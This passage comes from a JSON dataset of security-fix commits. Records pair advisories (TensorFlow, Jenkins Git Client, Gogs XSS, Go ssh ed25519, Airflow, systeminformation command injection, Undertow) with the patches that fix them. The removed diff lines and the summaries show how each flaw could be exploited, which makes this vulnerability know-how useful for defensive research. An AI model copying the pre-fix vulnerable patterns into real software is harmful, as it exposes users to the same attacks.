360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/482da92095c4d48f8784b1f00dda4f81c28d2988","commit_sha":"482da92095c4d48f8784b1f00dda4f81c28d2988","patch":"SINGLE","chain_ord":"['482da92095c4d48f8784b1f00dda4f81c28d2988']","before_first_fix_commit":"{'3b4351cc2d8ebf31d28dd78fb2730069d6716ad4'}","last_fix_commit":"482da92095c4d48f8784b1f00dda4f81c28d2988","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2021, 22:07:31","message":"Ensure non-empty padding_value input to tf.raw_ops.MatrixDiagPartV2, if a padding_value is input\n\nPiperOrigin-RevId: 388314614\nChange-Id: If0b51ad58d5d8543a6be6ce8f42ae4755c80d55f","author":"Laura Pak","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/482da92095c4d48f8784b1f00dda4f81c28d2988\/tensorflow%2Fcore%2Fkernels%2Flinalg%2Fmatrix_diag_op.cc', 'patch': '@@ -89,7 +89,10 @@ class MatrixDiagPartOp : public OpKernel {\\n           upper_diag_index = diag_index.flat<int32>()(1);\\n         }\\n       }\\n-      padding_value = context->input(2).flat<T>()(0);\\n+      const Tensor& padding_in = context->input(2);\\n+      OP_REQUIRES(context, padding_in.NumElements() == 1,\\n+                  errors::InvalidArgument(\"Padding must be scalar.\"));\\n+      padding_value = padding_in.flat<T>()(0);\\n     }\\n     const TensorShape& input_shape = input.shape();'}}","message_norm":"ensure non-empty padding_value input to tf.raw_ops.matrixdiagpartv2, if a padding_value is input\n\npiperorigin-revid: 388314614\nchange-id: if0b51ad58d5d8543a6be6ce8f42ae4755c80d55f","language":"en","entities":"[('ensure', 'ACTION', ''), ('388314614', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/linalg\/matrix_diag_op.cc'])","num_files":1.0},{"index":1719,"vuln_id":"GHSA-fcxw-hhxq-48wx","cwe_id":"{'CWE-200'}","score":3.3,"chain":"{'https:\/\/github.com\/jenkinsci\/git-client-plugin\/commit\/75ea3fe05650fc6ca09046a72493e2b3f066fb98'}","dataset":"osv","summary":"Insecure temporary file usage in Jenkins Git Client Plugin Jenkins Git Client Plugin 2.4.2 and earlier creates temporary file with insecure permissions resulting in information disclosure","published_date":"2022-05-17","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/git-client-plugin","commit_href":"https:\/\/github.com\/jenkinsci\/git-client-plugin\/commit\/75ea3fe05650fc6ca09046a72493e2b3f066fb98","commit_sha":"75ea3fe05650fc6ca09046a72493e2b3f066fb98","patch":"SINGLE","chain_ord":"['75ea3fe05650fc6ca09046a72493e2b3f066fb98']","before_first_fix_commit":"{'716e3ff56074c018c76cb35826269b976540e7e7'}","last_fix_commit":"75ea3fe05650fc6ca09046a72493e2b3f066fb98","chain_ord_pos":1.0,"commit_datetime":"04\/13\/2017, 04:38:54","message":"[Fix SECURITY-445] better protect temporary files\n\nTemporary files were previously written to the system temporary directory\nwith default permissions.  A malicious actor could have captured sensitive\ninformation by reading files from the temporary directory.  The temporary\nfiles typically are only on the file system for the duration of a single\ncommand line git invocation, but cloning a large git repo could require\nan extended time with those sensitive files in the temporary directory.\n\nThis change sets permissions on the temporary files to be readable only by\nthe file owner. If a workspace is available, a temporary directory adjacent\nto the workspace is used instead of the system temporary directory.","author":"Mark Waite","comments":null,"stats":"{'additions': 42, 'deletions': 9, 'total': 51}","files":"{'src\/main\/java\/org\/jenkinsci\/plugins\/gitclient\/CliGitAPIImpl.java': {'additions': 42, 'deletions': 9, 'changes': 51, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/git-client-plugin\/raw\/75ea3fe05650fc6ca09046a72493e2b3f066fb98\/src%2Fmain%2Fjava%2Forg%2Fjenkinsci%2Fplugins%2Fgitclient%2FCliGitAPIImpl.java', 'patch': '@@ -42,6 +42,11 @@\\n import java.net.URISyntaxException;\\n import java.nio.charset.Charset;\\n import java.nio.file.Files;\\n+import java.nio.file.Path;\\n+import java.nio.file.Paths;\\n+import java.nio.file.attribute.FileAttribute;\\n+import java.nio.file.attribute.PosixFilePermission;\\n+import java.nio.file.attribute.PosixFilePermissions;\\n import java.text.MessageFormat;\\n import java.util.ArrayList;\\n import java.util.Arrays;\\n@@ -1411,6 +1416,34 @@ public void addNote(String note, String namespace ) throws GitException, Interru\\n         createNote(note,namespace,\"add\");\\n     }\\n \\n+    private File createTempFileInSystemDir(String prefix, String suffix) throws IOException {\\n+        if (isWindows()) {\\n+            return Files.createTempFile(prefix, suffix).toFile();\\n+        }\\n+        Set<PosixFilePermission> ownerOnly = PosixFilePermissions.fromString(\"rw-------\");\\n+        FileAttribute fileAttribute = PosixFilePermissions.asFileAttribute(ownerOnly);\\n+        return Files.createTempFile(prefix, suffix, fileAttribute).toFile();\\n+    }\\n+\\n+    private File createTempFile(String prefix, String suffix) throws IOException {\\n+        if (workspace == null) {\\n+            return createTempFileInSystemDir(prefix, suffix);\\n+        }\\n+        File workspaceTmp = new File(workspace.getAbsolutePath() + \"@tmp\");\\n+        if (!workspaceTmp.isDirectory() && !workspaceTmp.mkdirs()) {\\n+            if (!workspaceTmp.isDirectory()) {\\n+                return createTempFileInSystemDir(prefix, suffix);\\n+            }\\n+        }\\n+        Path tmpPath = Paths.get(workspaceTmp.getAbsolutePath());\\n+        if (isWindows()) {\\n+            return Files.createTempFile(tmpPath, prefix, suffix).toFile();\\n+        }\\n+        Set<PosixFilePermission> ownerOnly = PosixFilePermissions.fromString(\"rw-------\");\\n+        FileAttribute fileAttribute = PosixFilePermissions.asFileAttribute(ownerOnly);\\n+        return Files.createTempFile(tmpPath, prefix, suffix, fileAttribute).toFile();\\n+    }\\n+\\n     private void deleteTempFile(File tempFile) {\\n         if (tempFile != null && !tempFile.delete() && tempFile.exists()) {\\n             listener.getLogger().println(\"[WARNING] temp file \" + tempFile + \" not deleted\");\\n@@ -1420,7 +1453,7 @@ private void deleteTempFile(File tempFile) {\\n     private void createNote(String note, String namespace, String command ) throws GitException, InterruptedException {\\n         File msg = null;\\n         try {\\n-            msg = File.createTempFile(\"git-note\", \"txt\", workspace);\\n+            msg = createTempFile(\"git-note\", \".txt\");\\n             FileUtils.writeStringToFile(msg,note);\\n             launchCommand(\"notes\", \"--ref=\" + namespace, command, \"-F\", msg.getAbsolutePath());\\n         } catch (IOException | GitException e) {\\n@@ -1561,7 +1594,7 @@ private String launchCommandWithCredentials(ArgumentListBuilder args, File workD\\n     }\\n \\n     private File createSshKeyFile(SSHUserPrivateKey sshUser) throws IOException, InterruptedException {\\n-        File key = File.createTempFile(\"ssh\", \"key\");\\n+        File key = createTempFile(\"ssh\", \".key\");\\n         try (PrintWriter w = new PrintWriter(key, Charset.defaultCharset().toString())) {\\n             List<String> privateKeys = sshUser.getPrivateKeys();\\n             for (String s : privateKeys) {\\n@@ -1597,7 +1630,7 @@ private String quoteUnixCredentials(String str) {\\n     }\\n \\n     private File createWindowsSshAskpass(SSHUserPrivateKey sshUser) throws IOException {\\n-        File ssh = File.createTempFile(\"pass\", \".bat\");\\n+        File ssh = createTempFile(\"pass\", \".bat\");\\n         try (PrintWriter w = new PrintWriter(ssh, Charset.defaultCharset().toString())) {\\n             \/\/ avoid echoing command as part of the password\\n             w.println(\"@echo off\");\\n@@ -1610,7 +1643,7 @@ private File createWindowsSshAskpass(SSHUserPrivateKey sshUser) throws IOExcepti\\n     }\\n \\n     private File createUnixSshAskpass(SSHUserPrivateKey sshUser) throws IOException {\\n-        File ssh = File.createTempFile(\"pass\", \".sh\");\\n+        File ssh = createTempFile(\"pass\", \".sh\");\\n         try (PrintWriter w = new PrintWriter(ssh, Charset.defaultCharset().toString())) {\\n             w.println(\"#!\/bin\/sh\");\\n             w.println(\"echo \\'\" + quoteUnixCredentials(Secret.toString(sshUser.getPassphrase())) + \"\\'\");\\n@@ -1621,7 +1654,7 @@ private File createUnixSshAskpass(SSHUserPrivateKey sshUser) throws IOException\\n \\n     \/* Package protected for testability *\/\\n     File createWindowsBatFile(String userName, String password) throws IOException {\\n-        File askpass = File.createTempFile(\"pass\", \".bat\");\\n+        File askpass = createTempFile(\"pass\", \".bat\");\\n         try (PrintWriter w = new PrintWriter(askpass, Charset.defaultCharset().toString())) {\\n             w.println(\"@set arg=%~1\");\\n             w.println(\"@if (%arg:~0,8%)==(Username) echo \" + escapeWindowsCharsForUnquotedString(userName));\\n@@ -1636,7 +1669,7 @@ private File createWindowsStandardAskpass(StandardUsernamePasswordCredentials cr\\n     }\\n \\n     private File createUnixStandardAskpass(StandardUsernamePasswordCredentials creds) throws IOException {\\n-        File askpass = File.createTempFile(\"pass\", \".sh\");\\n+        File askpass = createTempFile(\"pass\", \".sh\");\\n         try (PrintWriter w = new PrintWriter(askpass, Charset.defaultCharset().toString())) {\\n             w.println(\"#!\/bin\/sh\");\\n             w.println(\"case \\\\\"$1\\\\\" in\");\\n@@ -1766,7 +1799,7 @@ private File getSSHExeFromGitExeParentDir(String userGitExe) {\\n     }\\n \\n     private File createWindowsGitSSH(File key, String user) throws IOException {\\n-        File ssh = File.createTempFile(\"ssh\", \".bat\");\\n+        File ssh = createTempFile(\"ssh\", \".bat\");\\n \\n         File sshexe = getSSHExecutable();\\n \\n@@ -1779,7 +1812,7 @@ private File createWindowsGitSSH(File key, String user) throws IOException {\\n     }\\n \\n     private File createUnixGitSSH(File key, String user) throws IOException {\\n-        File ssh = File.createTempFile(\"ssh\", \".sh\");\\n+        File ssh = createTempFile(\"ssh\", \".sh\");\\n         try (PrintWriter w = new PrintWriter(ssh, Charset.defaultCharset().toString())) {\\n             w.println(\"#!\/bin\/sh\");\\n             \/\/ ${SSH_ASKPASS} might be ignored if ${DISPLAY} is not set\\n@@ -2383,7 +2416,7 @@ public void branch(String name) throws GitException, InterruptedException {\\n     public void commit(String message) throws GitException, InterruptedException {\\n         File f = null;\\n         try {\\n-            f = File.createTempFile(\"gitcommit\", \".txt\");\\n+            f = createTempFile(\"gitcommit\", \".txt\");\\n             try (OutputStream out = Files.newOutputStream(f.toPath())) {\\n                 out.write(message.getBytes(Charset.defaultCharset().toString()));\\n             }'}}","message_norm":"[fix security-445] better protect temporary files\n\ntemporary files were previously written to the system temporary directory\nwith default permissions.  a malicious actor could have captured sensitive\ninformation by reading files from the temporary directory.  the temporary\nfiles typically are only on the file system for the duration of a single\ncommand line git invocation, but cloning a large git repo could require\nan extended time with those sensitive files in the temporary directory.\n\nthis change sets permissions on the temporary files to be readable only by\nthe file owner. if a workspace is available, a temporary directory adjacent\nto the workspace is used instead of the system temporary directory.","language":"en","entities":"[('fix', 'ACTION', ''), ('security-445', 'SECWORD', ''), ('protect', 'SECWORD', ''), ('permissions', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('sensitive', 'SECWORD', ''), ('sensitive', 'SECWORD', ''), ('permissions', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/jenkinsci\/plugins\/gitclient\/CliGitAPIImpl.java'])","num_files":1.0},{"index":1720,"vuln_id":"GHSA-ff28-f46g-r9g8","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/gogs\/gogs\/commit\/bc77440b301ac8780698be91dff1ac33b7cee850'}","dataset":"osv","summary":"Cross-site Scripting in Gogs ### Impact\n\nThe malicious user is able to upload a crafted SVG file as the issue attachment to archive XSS. All installations [allow uploading SVG (`text\/xml`) files as issue attachments (non-default)](https:\/\/github.com\/gogs\/gogs\/blob\/e51e01683408e10b3dcd2ace65e259ca7f0fd61b\/conf\/app.ini#L283-L284) are affected.\n\n### Patches\n\nCorrectly setting the Content Security Policy for the serving endpoint. Users should upgrade to 0.12.7 or the latest 0.13.0+dev.\n\n### Workarounds\n\n[Disable uploading SVG files (`text\/xml`) as issue attachments](https:\/\/github.com\/gogs\/gogs\/blob\/e51e01683408e10b3dcd2ace65e259ca7f0fd61b\/conf\/app.ini#L283-L284).\n\n### References\n\nhttps:\/\/huntr.dev\/bounties\/34a12146-3a5d-4efc-a0f8-7a3ae04b198d\/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https:\/\/github.com\/gogs\/gogs\/issues\/6919.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/gogs\/gogs","commit_href":"https:\/\/github.com\/gogs\/gogs\/commit\/bc77440b301ac8780698be91dff1ac33b7cee850","commit_sha":"bc77440b301ac8780698be91dff1ac33b7cee850","patch":"SINGLE","chain_ord":"['bc77440b301ac8780698be91dff1ac33b7cee850']","before_first_fix_commit":"{'2a8f561c6413ed7683a3844a8ae6b68d30c0dd08'}","last_fix_commit":"bc77440b301ac8780698be91dff1ac33b7cee850","chain_ord_pos":1.0,"commit_datetime":"05\/03\/2022, 09:51:28","message":"attachment: set CSP header in the serving endpoint (#6926)","author":"Joe Chen","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'internal\/cmd\/web.go': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gogs\/gogs\/raw\/bc77440b301ac8780698be91dff1ac33b7cee850\/internal%2Fcmd%2Fweb.go', 'patch': '@@ -314,6 +314,7 @@ func runWeb(c *cli.Context) error {\\n \\t\\t\\t\\t}\\n \\t\\t\\t\\tdefer fr.Close()\\n \\n+\\t\\t\\t\\tc.Header().Set(\"Content-Security-Policy\", \"default-src \\'none\\'; style-src \\'unsafe-inline\\'; sandbox\")\\n \\t\\t\\t\\tc.Header().Set(\"Cache-Control\", \"public,max-age=86400\")\\n \\t\\t\\t\\tc.Header().Set(\"Content-Disposition\", fmt.Sprintf(`inline; filename=\"%s\"`, attach.Name))'}}","message_norm":"attachment: set csp header in the serving endpoint (#6926)","language":"en","entities":"[('csp header', 'SECWORD', ''), ('#6926', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['internal\/cmd\/web.go'])","num_files":1.0},{"index":1724,"vuln_id":"GHSA-ffhg-7mh4-33c4","cwe_id":"{'CWE-347'}","score":7.5,"chain":"{'https:\/\/github.com\/golang\/crypto\/commit\/bac4c82f69751a6dd76e702d54b3ceb88adab236'}","dataset":"osv","summary":"Improper Verification of Cryptographic Signature in golang.org\/x\/crypto golang.org\/x\/crypto before v0.0.0-20200220183623-bac4c82f6975 for Go allows a panic during signature verification in the golang.org\/x\/crypto\/ssh package. A client can attack an SSH server that accepts public keys. Also, a server can attack any SSH client.","published_date":"2021-05-18","chain_len":1,"project":"https:\/\/github.com\/golang\/crypto","commit_href":"https:\/\/github.com\/golang\/crypto\/commit\/bac4c82f69751a6dd76e702d54b3ceb88adab236","commit_sha":"bac4c82f69751a6dd76e702d54b3ceb88adab236","patch":"SINGLE","chain_ord":"['bac4c82f69751a6dd76e702d54b3ceb88adab236']","before_first_fix_commit":"{'1ad67e1f0ef495d4014b6ffd8f2cf80f91fffbce'}","last_fix_commit":"bac4c82f69751a6dd76e702d54b3ceb88adab236","chain_ord_pos":1.0,"commit_datetime":"02\/11\/2020, 23:53:37","message":"ssh: return an error for malformed ed25519 public keys rather than panic\n\nAn attacker can craft an ssh-ed25519 or sk-ssh-ed25519@openssh.com\npublic key, such that the library will panic when trying to verify a\nsignature with it. Clients can deliver such a public key and signature\nto any golang.org\/x\/crypto\/ssh server with a PublicKeyCallback, and\nservers can deliver them to any golang.org\/x\/crypto\/ssh client.\n\nThis issue was discovered and reported by Alex Gaynor, Fish in a Barrel,\nand is tracked as CVE-2020-9283.\n\nChange-Id: Ie25b78a0b0181fbbc8cc7de4f4e27d908777529c\nReviewed-on: https:\/\/go-review.googlesource.com\/c\/crypto\/+\/220357\nRun-TryBot: Filippo Valsorda <filippo@golang.org>\nReviewed-by: Katie Hockman <katie@golang.org>\nTryBot-Result: Gobot Gobot <gobot@golang.org>","author":"Filippo Valsorda","comments":null,"stats":"{'additions': 20, 'deletions': 8, 'total': 28}","files":"{'ssh\/keys.go': {'additions': 20, 'deletions': 8, 'changes': 28, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/golang\/crypto\/raw\/bac4c82f69751a6dd76e702d54b3ceb88adab236\/ssh%2Fkeys.go', 'patch': '@@ -562,9 +562,11 @@ func parseED25519(in []byte) (out PublicKey, rest []byte, err error) {\\n \\t\\treturn nil, nil, err\\n \\t}\\n \\n-\\tkey := ed25519.PublicKey(w.KeyBytes)\\n+\\tif l := len(w.KeyBytes); l != ed25519.PublicKeySize {\\n+\\t\\treturn nil, nil, fmt.Errorf(\"invalid size %d for Ed25519 public key\", l)\\n+\\t}\\n \\n-\\treturn (ed25519PublicKey)(key), w.Rest, nil\\n+\\treturn ed25519PublicKey(w.KeyBytes), w.Rest, nil\\n }\\n \\n func (k ed25519PublicKey) Marshal() []byte {\\n@@ -582,9 +584,11 @@ func (k ed25519PublicKey) Verify(b []byte, sig *Signature) error {\\n \\tif sig.Format != k.Type() {\\n \\t\\treturn fmt.Errorf(\"ssh: signature type %s for key type %s\", sig.Format, k.Type())\\n \\t}\\n+\\tif l := len(k); l != ed25519.PublicKeySize {\\n+\\t\\treturn fmt.Errorf(\"ssh: invalid size %d for Ed25519 public key\", l)\\n+\\t}\\n \\n-\\tedKey := (ed25519.PublicKey)(k)\\n-\\tif ok := ed25519.Verify(edKey, b, sig.Blob); !ok {\\n+\\tif ok := ed25519.Verify(ed25519.PublicKey(k), b, sig.Blob); !ok {\\n \\t\\treturn errors.New(\"ssh: signature did not verify\")\\n \\t}\\n \\n@@ -838,6 +842,10 @@ func parseSKEd25519(in []byte) (out PublicKey, rest []byte, err error) {\\n \\t\\treturn nil, nil, err\\n \\t}\\n \\n+\\tif l := len(w.KeyBytes); l != ed25519.PublicKeySize {\\n+\\t\\treturn nil, nil, fmt.Errorf(\"invalid size %d for Ed25519 public key\", l)\\n+\\t}\\n+\\n \\tkey := new(skEd25519PublicKey)\\n \\tkey.application = w.Application\\n \\tkey.PublicKey = ed25519.PublicKey(w.KeyBytes)\\n@@ -862,6 +870,9 @@ func (k *skEd25519PublicKey) Verify(data []byte, sig *Signature) error {\\n \\tif sig.Format != k.Type() {\\n \\t\\treturn fmt.Errorf(\"ssh: signature type %s for key type %s\", sig.Format, k.Type())\\n \\t}\\n+\\tif l := len(k.PublicKey); l != ed25519.PublicKeySize {\\n+\\t\\treturn fmt.Errorf(\"invalid size %d for Ed25519 public key\", l)\\n+\\t}\\n \\n \\th := sha256.New()\\n \\th.Write([]byte(k.application))\\n@@ -898,8 +909,7 @@ func (k *skEd25519PublicKey) Verify(data []byte, sig *Signature) error {\\n \\n \\toriginal := Marshal(blob)\\n \\n-\\tedKey := (ed25519.PublicKey)(k.PublicKey)\\n-\\tif ok := ed25519.Verify(edKey, original, edSig.Signature); !ok {\\n+\\tif ok := ed25519.Verify(k.PublicKey, original, edSig.Signature); !ok {\\n \\t\\treturn errors.New(\"ssh: signature did not verify\")\\n \\t}\\n \\n@@ -1051,7 +1061,10 @@ func NewPublicKey(key interface{}) (PublicKey, error) {\\n \\tcase *dsa.PublicKey:\\n \\t\\treturn (*dsaPublicKey)(key), nil\\n \\tcase ed25519.PublicKey:\\n-\\t\\treturn (ed25519PublicKey)(key), nil\\n+\\t\\tif l := len(key); l != ed25519.PublicKeySize {\\n+\\t\\t\\treturn nil, fmt.Errorf(\"ssh: invalid size %d for Ed25519 public key\", l)\\n+\\t\\t}\\n+\\t\\treturn ed25519PublicKey(key), nil\\n \\tdefault:\\n \\t\\treturn nil, fmt.Errorf(\"ssh: unsupported key type %T\", key)\\n \\t}\\n@@ -1304,7 +1317,6 @@ func parseOpenSSHPrivateKey(key []byte, decrypt openSSHDecryptFunc) (crypto.Priv\\n \\t\\treturn nil, errors.New(\"ssh: malformed OpenSSH key\")\\n \\t}\\n \\n-\\t\/\/ we only handle ed25519 and rsa keys currently\\n \\tswitch pk1.Keytype {\\n \\tcase KeyAlgoRSA:\\n \\t\\t\/\/ https:\/\/github.com\/openssh\/openssh-portable\/blob\/master\/sshkey.c#L2760-L2773'}}","message_norm":"ssh: return an error for malformed ed25519 public keys rather than panic\n\nan attacker can craft an ssh-ed25519 or sk-ssh-ed25519@openssh.com\npublic key, such that the library will panic when trying to verify a\nsignature with it. clients can deliver such a public key and signature\nto any golang.org\/x\/crypto\/ssh server with a publickeycallback, and\nservers can deliver them to any golang.org\/x\/crypto\/ssh client.\n\nthis issue was discovered and reported by alex gaynor, fish in a barrel,\nand is tracked as cve-2020-9283.\n\nchange-id: ie25b78a0b0181fbbc8cc7de4f4e27d908777529c\nreviewed-on: https:\/\/go-review.googlesource.com\/c\/crypto\/+\/220357\nrun-trybot: filippo valsorda <filippo@golang.org>\nreviewed-by: katie hockman <katie@golang.org>\ntrybot-result: gobot gobot <gobot@golang.org>","language":"en","entities":"[('ssh', 'SECWORD', ''), ('error', 'FLAW', ''), ('ed25519', 'SHA', 'generic_sha'), ('public keys', 'SECWORD', ''), ('attacker', 'FLAW', ''), ('ssh', 'SECWORD', ''), ('ed25519', 'SHA', 'generic_sha'), ('public key', 'SECWORD', ''), ('verify', 'ACTION', ''), ('signature', 'SECWORD', ''), ('public key', 'SECWORD', ''), ('signature', 'SECWORD', ''), ('golang.org\/x\/crypto\/ssh', 'SECWORD', ''), ('server', 'SECWORD', ''), ('publickeycallback', 'SECWORD', ''), ('servers', 'SECWORD', ''), ('golang.org\/x\/crypto\/ssh', 'SECWORD', ''), ('issue', 'FLAW', ''), ('cve-2020-9283', 'VULNID', 'CVE'), ('https:\/\/go-review.googlesource.com\/c\/crypto\/+\/220357', 'SECWORD', ''), ('filippo@golang.org', 'EMAIL', ''), ('katie@golang.org', 'EMAIL', ''), ('gobot@golang.org', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ssh\/keys.go'])","num_files":1.0},{"index":1730,"vuln_id":"GHSA-fh37-cx83-q542","cwe_id":"{'CWE-306', 'CWE-269', 'CWE-287'}","score":5.3,"chain":"{'https:\/\/github.com\/apache\/airflow\/commit\/21cedff205e7d62675949fda2aa4616d77232b76'}","dataset":"osv","summary":"Improper Authentication in Apache Airflow The lineage endpoint of the deprecated Experimental API was not protected by authentication in Airflow 2.0.0. This allowed unauthenticated users to hit that endpoint. This is low-severity issue as the attacker needs to be aware of certain parameters to pass to that endpoint and even after can just get some metadata about a DAG and a Task. This issue only affects Apache Airflow 2.0.0.","published_date":"2021-06-18","chain_len":1,"project":"https:\/\/github.com\/apache\/airflow","commit_href":"https:\/\/github.com\/apache\/airflow\/commit\/21cedff205e7d62675949fda2aa4616d77232b76","commit_sha":"21cedff205e7d62675949fda2aa4616d77232b76","patch":"SINGLE","chain_ord":"['21cedff205e7d62675949fda2aa4616d77232b76']","before_first_fix_commit":"{'4b1a6f78d132e42f1c946f53eca89789d21bdc1d'}","last_fix_commit":"21cedff205e7d62675949fda2aa4616d77232b76","chain_ord_pos":1.0,"commit_datetime":"01\/27\/2021, 21:47:45","message":"Add authentication to lineage endpoint for experimental API (#13870)\n\n(cherry picked from commit 24a54242d56058846c7978130b3f37ca045d5142)","author":"Ian Carroll","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'airflow\/www\/api\/experimental\/endpoints.py': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/airflow\/raw\/21cedff205e7d62675949fda2aa4616d77232b76\/airflow%2Fwww%2Fapi%2Fexperimental%2Fendpoints.py', 'patch': '@@ -389,6 +389,7 @@ def delete_pool(name):\\n \\n \\n @api_experimental.route(\\'\/lineage\/<string:dag_id>\/<string:execution_date>\\', methods=[\\'GET\\'])\\n+@requires_authentication\\n def get_lineage(dag_id: str, execution_date: str):\\n     \"\"\"Get Lineage details for a DagRun\"\"\"\\n     # Convert string datetime into actual datetime'}}","message_norm":"add authentication to lineage endpoint for experimental api (#13870)\n\n(cherry picked from commit 24a54242d56058846c7978130b3f37ca045d5142)","language":"en","entities":"[('add', 'ACTION', ''), ('authentication', 'SECWORD', ''), ('#13870', 'ISSUE', ''), ('commit 24a54242d56058846c7978130b3f37ca045d5142', 'SHA', 'prefix_colon_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['airflow\/www\/api\/experimental\/endpoints.py'])","num_files":1.0},{"index":1737,"vuln_id":"GHSA-fj59-f6c3-3vw4","cwe_id":"{'CWE-78'}","score":5.9,"chain":"{'https:\/\/github.com\/sebhildebrandt\/systeminformation\/commit\/bad372e654cdd549e7d786acbba0035ded54c607'}","dataset":"osv","summary":"Command Injection in systeminformation ### Impact\ncommand injection vulnerability\n\n### Patches\nProblem was fixed with a shell string sanitation fix. Please upgrade to version >= 4.26.2\n\n### Workarounds\nIf you cannot upgrade, be sure to check or sanitize service parameter strings that are passed to `is.services()`, `is.inetChecksite()`, `si.inetLatency()`, `si.networkStats()`, `is.services()` and `si.processLoad()`\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [systeminformation](https:\/\/github.com\/sebhildebrandt\/systeminformation)","published_date":"2020-10-27","chain_len":1,"project":"https:\/\/github.com\/sebhildebrandt\/systeminformation","commit_href":"https:\/\/github.com\/sebhildebrandt\/systeminformation\/commit\/bad372e654cdd549e7d786acbba0035ded54c607","commit_sha":"bad372e654cdd549e7d786acbba0035ded54c607","patch":"SINGLE","chain_ord":"['bad372e654cdd549e7d786acbba0035ded54c607']","before_first_fix_commit":"{'147550532ab11cac4b609844a519a1d945f5c103'}","last_fix_commit":"bad372e654cdd549e7d786acbba0035ded54c607","chain_ord_pos":1.0,"commit_datetime":"05\/19\/2020, 15:02:51","message":"improved shell sanitation","author":"Sebastian Hildebrandt","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'lib\/util.js': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sebhildebrandt\/systeminformation\/raw\/bad372e654cdd549e7d786acbba0035ded54c607\/lib%2Futil.js', 'patch': '@@ -503,6 +503,9 @@ function sanitizeShellString(str) {\\n   result = result.replace(\/\\\\$\/g, \"\");\\n   result = result.replace(\/#\/g, \"\");\\n   result = result.replace(\/\\\\\\\\\/g, \"\");\\n+  result = result.replace(\/\\\\t\/g, \"\");\\n+  result = result.replace(\/\\\\n\/g, \"\");\\n+  result = result.replace(\/\\\\\"\/g, \"\");\\n   return result\\n }'}}","message_norm":"improved shell sanitation","language":"en","entities":"[('improved', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/util.js'])","num_files":1.0},{"index":1739,"vuln_id":"GHSA-fj7c-vg2v-ccrm","cwe_id":"{'CWE-400'}","score":0.0,"chain":"{'https:\/\/github.com\/undertow-io\/undertow\/commit\/c7e84a0b7efced38506d7d1dfea5902366973877'}","dataset":"osv","summary":"Undertow vulnerable to memory exhaustion due to buffer leak Buffer leak on incoming WebSocket PONG message(s) in Undertow before 2.0.40 and 2.2.10 can lead to memory exhaustion and allow a denial of service.","published_date":"2022-07-15","chain_len":1,"project":"https:\/\/github.com\/undertow-io\/undertow","commit_href":"https:\/\/github.com\/undertow-io\/undertow\/commit\/c7e84a0b7efced38506d7d1dfea5902366973877","commit_sha":"c7e84a0b7efced38506d7d1dfea5902366973877","patch":"SINGLE","chain_ord":"['c7e84a0b7efced38506d7d1dfea5902366973877']","before_first_fix_commit":"{'87f31ddaac835e3b41db339c1841760a1bac004f'}","last_fix_commit":"c7e84a0b7efced38506d7d1dfea5902366973877","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 21:26:57","message":"[UNDERTOW-1935] - buffer leak on incoming websocket PONG message","author":"Andrey Marinchuk","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'websockets-jsr\/src\/main\/java\/io\/undertow\/websockets\/jsr\/FrameHandler.java': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/undertow-io\/undertow\/raw\/c7e84a0b7efced38506d7d1dfea5902366973877\/websockets-jsr%2Fsrc%2Fmain%2Fjava%2Fio%2Fundertow%2Fwebsockets%2Fjsr%2FFrameHandler.java', 'patch': '@@ -152,6 +152,8 @@ public void run() {\\n                     }\\n                 }\\n             });\\n+        } else {\\n+            bufferedBinaryMessage.getData().free();\\n         }\\n     }'}}","message_norm":"[undertow-1935] - buffer leak on incoming websocket pong message","language":"en","entities":"[('leak', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['websockets-jsr\/src\/main\/java\/io\/undertow\/websockets\/jsr\/FrameHandler.java'])","num_files":1.0},{"index":1741,"vuln_id":"GHSA-fj7f-vq84-fh43","cwe_id":"{'CWE-88'}","score":6.7,"chain":"{'https:\/\/github.com\/rubygems\/rubygems\/commit\/a4f2f8ac17e6ce81c689527a8b6f14381060d95f', 'https:\/\/github.com\/rubygems\/rubygems\/commit\/0fad1ccfe9dd7a3c5b82c1496df3c2b4842870d3'}","dataset":"osv","summary":"Local Code Execution through Argument Injection via dash leading git url parameter in Gemfile. In `bundler` versions before 2.2.33, when working with untrusted and apparently harmless `Gemfile`'s, it is not expected that they lead to execution of external code, unless that's explicit in the ruby code inside the `Gemfile` itself. However, if the `Gemfile` includes `gem` entries that use the `git` option with invalid, but seemingly harmless, values 